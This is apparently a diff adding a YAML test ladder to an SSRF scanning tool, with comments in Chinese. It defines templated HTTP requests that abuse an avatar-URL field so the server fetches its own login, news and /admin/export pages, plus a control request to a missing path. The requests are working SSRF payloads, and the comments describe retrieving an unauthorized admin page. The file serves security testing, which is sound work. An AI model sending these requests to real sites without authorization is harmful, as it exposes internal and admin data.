@@ -1,0 +1,50 @@
+# 可执行阶梯 —— ssrf（头像 URL 直接拉取，无协议/主机校验）
+#
+# 依据：plugins/ssrf/plugin.yaml（POST /profile/avatar-url；marker 为成功拉取的 JSON 字段
+# `"bytes":` / `"head":`），字段名由 profile surface 提供（{{AVATAR_URL_FIELD}}）。
+# 阶梯的价值：**内网面扫描**——从自己站点到回环地址，看服务端替我们拉了什么。
+class: ssrf
+display: 服务端请求伪造（任意 URL 拉取）
+
+baseline:
+  param_value: "1"
+
+steps:
+  - id: fetch_self_login
+    kind: request
+    value: |
+      POST {{TARGET}}/profile/avatar-url HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: {{SESSION}}
+
+      {{AVATAR_URL_FIELD}}={{TARGET}}/login
+    note: 拉本站登录页（库内同形）
+
+  - id: fetch_self_news
+    kind: request
+    value: |
+      POST {{TARGET}}/profile/avatar-url HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: {{SESSION}}
+
+      {{AVATAR_URL_FIELD}}={{TARGET}}/news
+
+  - id: fetch_loopback_admin
+    kind: request
+    value: |
+      POST {{TARGET}}/profile/avatar-url HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: {{SESSION}}
+
+      {{AVATAR_URL_FIELD}}={{TARGET}}/admin/export
+    note: 打管理面（未授权面被服务端替我们取回）
+
+  - id: fetch_control_missing
+    kind: request
+    value: |
+      POST {{TARGET}}/profile/avatar-url HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: {{SESSION}}
+
+      {{AVATAR_URL_FIELD}}={{TARGET}}/no-such-path-ladder
+    note: 对照组：拉一个不存在的路径应报 fetch failed ⇒ 证明 marker 只在真的取回内容时出现
